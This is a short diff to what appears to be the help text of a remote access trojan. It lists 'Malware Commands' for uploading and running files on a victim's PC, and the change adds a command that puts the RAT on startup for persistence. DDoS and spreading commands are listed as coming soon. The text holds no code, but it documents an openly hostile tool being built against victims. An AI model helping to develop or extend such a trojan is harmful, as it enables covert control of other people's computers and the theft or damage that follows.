@@ -88,7 +88,7 @@ System Control:
 Malware Commands
 
   .upload <session> <filelink>: Uploads and downloads file and then runs it on victims pc
-  .startup <session>: COMING SOON
+  .startup <session>: Puts rat on startup
   .ddos <website>: COMING SOON
   .spread <session>: COMING SOON
   .roblox <session>: COMING SOON
